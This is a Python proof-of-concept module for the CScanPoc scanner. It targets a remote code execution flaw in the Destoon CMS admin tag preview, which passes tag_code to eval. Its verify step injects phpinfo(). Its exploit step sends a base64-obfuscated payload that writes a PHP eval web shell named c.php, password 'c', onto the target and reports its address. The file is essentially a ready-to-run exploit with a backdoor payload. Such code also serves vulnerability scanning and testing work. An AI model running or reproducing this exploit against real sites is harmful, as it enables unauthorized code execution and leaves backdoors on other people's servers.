# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Destoon_0004_L'  # 平台漏洞编号，留空
    name = 'Destoon 后台命令执行引发前台csrf Getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
        后台一处命令执行漏洞，可直接导致代码执行。
        漏洞位于admin/tag.inc.php
        eval函数直接执行参数tag_code和t
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2314/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Destoon'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f8409078-7f26-4a2a-934f-7c45c6ed753e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/admin.php?file=tag&action=preview&tag_code={phpinfo()}'
            url = self.target + payload
            r = requests.get(url)

            if 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #
            payload = '/admin.php?file=tag&action=preview&tag_code={fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x));}'
            url = self.target + payload
            r = requests.get(url)

            self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                target=self.target, name=self.vuln.name, url=self.target+'/c.php'))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
